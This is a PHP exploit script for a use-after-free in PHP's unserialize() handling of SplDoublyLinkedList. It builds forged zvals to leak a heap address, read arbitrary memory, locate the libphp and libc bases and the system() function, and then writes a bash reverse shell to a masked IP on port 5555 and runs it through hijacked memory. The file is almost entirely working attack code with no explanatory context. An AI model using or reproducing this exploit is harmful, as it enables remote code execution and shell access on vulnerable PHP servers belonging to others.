<?php
class obj {
  var $ryat;
  function __wakeup() {
    $this->ryat = 1;
  }
}
$fakezval = pack8(0);
$fakezval .= pack8(0);
$fakezval .= "\x00\x00\x00\x00";
$fakezval .= "\x01";
$fakezval .= "\x00";
$fakezval .= "\x00\x00";
$inner = 'i:1234;:i:1;';
$exploit = 'a:6:{';
$exploit .= 'i:0;i:1;';
$exploit .= 'i:1;C:19:"SplDoublyLinkedList":'.strlen($inner).':{'.$inner.'}';
$exploit .= 'i:2;O:3:"obj":1:{s:4:"ryat";R:3;}';
$exploit .= 'i:3;a:1:{i:0;R:5;}';
$exploit .= 'i:4;s:'.strlen($fakezval).':"'.$fakezval.'";';
$exploit .= 'i:5;O:3:"obj":1:{s:4:"ryat";R:4;}'; # free fakezval, puts a heap addr on its value
$exploit .= '}';
$data = unserialize($exploit);
// Use var_dump to leak the heap address. Using PHP code to read it 
// causes the memory of the freed zval to be reallocated. A more elegant 
// solution would do some heap feng shui instead.
var_dump($data);
function read_memory($addr, $length) {
  $fakezval = pack8($addr);
  $fakezval .= pack8($length);
  $fakezval .= "\x00\x00\x00\x00";
  $fakezval .= "\x06";
  $fakezval .= "\x00";
  $fakezval .= "\x00\x00";
  
  $inner = 'i:1234;:i:1;';
  $exploit = 'a:5:{';
  $exploit .= 'i:0;i:1;';
  $exploit .= 'i:1;C:19:"SplDoublyLinkedList":'.strlen($inner).':{'.$inner.'}';
  $exploit .= 'i:2;O:3:"obj":1:{s:4:"ryat";R:3;}';
  $exploit .= 'i:3;a:1:{i:0;R:5;}';
  $exploit .= 'i:4;s:'.strlen($fakezval).':"'.$fakezval.'";';
  $exploit .= '}';
  $data = unserialize($exploit);
  // Make a copy of the string so that it stays valid even if fakezval 
  // gets destroyed.
  return substr($data[3][0], 0, $length);
}
function combine_halves($low, $high) {
  return $low + $high * 0x100000000;
}
function read8($addr) {
  $mem = read_memory($addr, 8);
  $halves = unpack("L*", $mem);
  return combine_halves($halves[1], $halves[2]);
}
function pack8($addr) {
  return pack("LL", $addr & 0xffffffff, $addr >> 32);
}
if (!$_GET['heap_addr']) {
  die('done');
}
$objs = array();
for ($i = 0; $i < 4096; ++$i) {
  $objs[] = new obj;
}
$heap_addr = intval($_GET['heap_addr']) & ~0xfff;
echo posix_getpid(), "\n";
$mem = read_memory($heap_addr, 0x4000);
$values = unpack("L*", $mem);
$libphp_addr = 0;
for ($i = 1; $i < count($values) + 1; ++$i) {
  // handlers, refcount, type
  if (($values[$i+1] >> 8) == 0x7f && $values[$i+2] == 1 && $values[$i+3] == 5) {
    $libphp_addr = combine_halves($values[$i], $values[$i+1]);
    break;
  }
}
if ($libphp_addr == 0) {
  die("could not find libphp");
}
$libphp_base = ($libphp_addr & ~0xfff) - 0xb00000;
while (true) {
  $mem = read_memory($libphp_base, 4);
  if ($mem == "\x7fELF") {
    break;
  }
  $libphp_base -= 0x1000;
}
echo "libphp_base = ", dechex($libphp_base), "\n";
$malloc_got = $libphp_base + 0xb4c280;
$malloc_addr = read8($malloc_got);
$libc_base = $malloc_addr - 0x82750;
echo "libc_base = ", dechex($libc_base), "\n";
$system = $libc_base + 0x46640;
echo "system = ", dechex($system), "\n";
$objs = array();
for ($i = 0; $i < 8192; ++$i) {
  $objs[] = pack8($system);
}
$mem = read_memory($heap_addr, 0x20000);
$values = unpack("L*", $mem);
$system_addr = 0;
for ($i = 1; $i < count($values) + 1; ++$i) {
  if ($values[$i] == ($system & 0xffffffff) && $values[$i+1] == ($system >> 32)) {
    $system_addr = $heap_addr + ($i - 1) * 4;
    break;
  }
}
file_put_contents("/tmp/a", "bash -c 'bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/5555 0>&1'");
echo "system_addr = ", dechex($system_addr);
$fakezval = "sh /*/a;";
$fakezval .= pack8($system_addr - 8);
$fakezval .= "\x00\x00\x00\xff";
$fakezval .= "\x05";
$fakezval .= "\x00";
$fakezval .= "\x00\x00";
$inner = 'i:1234;:i:1;';
$exploit = 'a:6:{';
$exploit .= 'i:0;i:1;';
$exploit .= 'i:1;C:19:"SplDoublyLinkedList":'.strlen($inner).':{'.$inner.'}';
$exploit .= 'i:2;O:3:"obj":1:{s:4:"ryat";R:3;}';
$exploit .= 'i:3;a:1:{i:0;R:5;}';
$exploit .= 'i:4;s:'.strlen($fakezval).':"'.$fakezval.'";';
$exploit .= 'i:5;O:3:"obj":1:{s:4:"ryat";R:4;}';
$exploit .= '}';
$data = unserialize($exploit);?>